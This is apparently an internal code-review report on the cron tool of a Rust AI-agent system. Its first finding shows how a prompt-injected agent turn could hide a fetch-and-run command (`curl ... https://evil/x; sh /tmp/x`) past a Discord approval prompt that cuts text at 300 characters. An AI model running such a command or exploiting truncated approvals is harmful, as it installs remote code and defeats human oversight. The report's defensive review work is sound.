# Lane tools-context

### [P1] Cron approval prompt shows at most ~300 characters of the command it is approving
- Location: src/tools/mod.rs:162
- Trigger: A prompt-injected or careless turn calls `cron add` with a benign `script` of about 300 or more characters and an `ack_command` such as `curl -o /tmp/x https://evil/x; sh /tmp/x` (any command that passes `check_cron_script`). Policy is `smart` or `always`, so `CronTool::requires_approval` returns `schedule an unattended shell command via cron: script=...; ack_command=...`.
- Impact: The registry sends `&display_target` (the literal `<cron>`) as the command and the full text as the reason. The Discord sink cuts the reason to `APPROVAL_REASON_BUDGET` (300 chars, `truncate_approval_reason`, adapter.rs:4141) in both the embed field and the message body. The approver never sees the tail of the script or the `ack_command` (it is absent once the script is long enough). The 2026-10-13 round fixed only the hashed key, not what is shown. The approved text differs from what runs unattended through `sh -c`.
- Evidence:
  ```
  requester.request_approval_scoped(
      session,
      &display_target,
      &reason,
      &pattern_key,
  ```
  `&reason` is the only carrier of the shell text, and `truncate_approval_reason` caps it at 300 chars.
- Fix: Pass the full text as the displayed command, which has a 4000-char embed limit, and keep the reason short, e.g. `request_approval_scoped(session, &reason, "tool requires approval", &pattern_key)`. Refuse with `OmonError::Approval` when the text exceeds the display budget. Never request approval for text that cannot be shown in full.

### [P2] `cron add` with `deliver: "origin"` (or `"discord"`) in a Discord session creates a job that never delivers
- Location: src/tools/cron.rs:292
- Trigger: In a Discord session the model calls `cron add` with `deliver: "origin"` or `"all"`, without an `origin` object. This is the Hermes-style spelling and an obvious choice.
- Impact: The defaulting branch only runs when `deliver` is absent or `"local"`. So `origin` is never filled in. `delivery_destinations` (scheduler.rs:2578) resolves `origin`/`all`/`discord` only from `payload["origin"]`, finds none, and yields zero destinations. The job runs on schedule, `destinations.is_empty()` skips delivery, and the user's reminder is silently never sent. The `add` call still returns `registered`.
- Evidence: `if args.get("deliver").is_none() || args.get("deliver").and_then(Value::as_str) == Some("local")`. The default `origin`/`discord:<channel>` is applied only in this branch.
- Fix: Also apply the defaulting when `deliver` is `"origin"`, `"all"` or `"discord"` and `args.get("origin")` is absent.

### [P2] `cron update` recomputes `next_run_at` in UTC, ignoring the job's `schedule.timezone`
- Location: src/tools/cron.rs:595
- Trigger: `cron update` with a new `expression` (e.g. `"0 8 * * *"`) on an `omon_owned` job whose payload carries `schedule.timezone`. Examples are `omon:inbox-digest` (Asia/Seoul, inbox/digest.rs:35) and any dashboard-created job with a timezone.
- Impact: `register_with_id`, `resume` and the scheduler's completion path all use `next_run_tz(..., timezone)`. The tool uses plain `next_run`, so the first run lands at the UTC wall-clock hour instead of the job's timezone, hours off for Seoul. Later runs self-correct.
- Evidence: `Some(next_run(expression, now)?.to_rfc3339())` at line 595. The validation call at line 590 is `next_run(expression, now)?;`.
- Fix: Read `payload["schedule"]["timezone"]` and call `next_run_tz(expression, now, tz)` at both sites.

### [P2] `cron delete` leaves `cron_incidents` and `cron_notepads` rows, so a re-created job id inherits stale state
- Location: src/tools/cron.rs:366
- Trigger: Delete a job that had an acknowledged incident (`ack`) or notepad entries, then `cron add` the same id and have it fail with the same error text.
- Impact: Neither table has a foreign key to `cron_jobs` (migrations 0026 and 0027). `execute_job_with_outcome` suppresses failure alerts when `cron_incidents` already holds `acknowledged = 1` for `(job_id, error_signature)`. The new job's first failure is therefore swallowed. Old notepad values are also injected into the new job's prompt.
- Evidence: `let res = sqlx::query("DELETE FROM cron_jobs WHERE id = ?")`. It is the only delete issued, with no cleanup of the two tables.
- Fix: Delete the job's `cron_incidents` and `cron_notepads` rows in the same transaction as the job.

### [P2] `cron add` stores `context_from`, `skills`, `no_agent` and `model`, and the notepad actions write data, that native jobs never use
- Location: src/tools/cron.rs:701
- Trigger: `cron add` with `context_from` or `skills`, or `notepad_set` for a tool-created job. The tool-built payload has no `schedule` key.
- Impact: `AgentCronExecutor` routes payloads without `schedule` to `execute_native_cron` (executor.rs:41). That function never reads `context_from`, `skills`, `no_agent`, `model` or the notepads. Only the Hermes branch does (executor.rs:232-262). The tool reports `registered` or `ok`, but the job runs without the requested predecessor output, skills or notes.
- Evidence: `if let Some(context_from) = args.get("context_from") { payload["context_from"] = ... }`. A matching `skills` copy sits at line 704. Neither field is consumed on the native path.
- Fix: Either apply these fields in `execute_native_cron` (reuse `collect_notepads`, `resolve_predecessor_output` and `load_cron_skills`), or reject or omit them in the tool so it does not claim they were registered.